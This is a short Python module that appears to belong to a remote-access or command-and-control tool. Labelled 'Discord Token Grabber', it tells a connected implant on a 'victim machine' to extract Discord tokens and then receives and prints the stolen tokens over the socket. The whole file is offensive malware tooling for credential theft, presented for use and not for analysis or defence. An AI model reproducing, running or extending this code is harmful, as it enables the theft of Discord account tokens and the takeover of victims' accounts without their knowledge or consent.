from lib.debug import Debug
from lib.helper import ctime
import os

class module():
    def __init__(self):
        self.Command        = "token_grabber"
        self.Name           = "Discord Token Grabber"
        self.Description    = """This command extracts discord tokens from the victim machine."""
        self.Platform       = "multi"

    def _exec(self, dmos, args):
        dmos.conn.send(self.Command.encode())
        tokens = []
        while b'FIN' not in (d := dmos.conn.recv(1024)): #FIN
            tokens.append(d)
        Debug.tprint("Recieved extracted tokens:")
        for token in tokens:
            print(token)

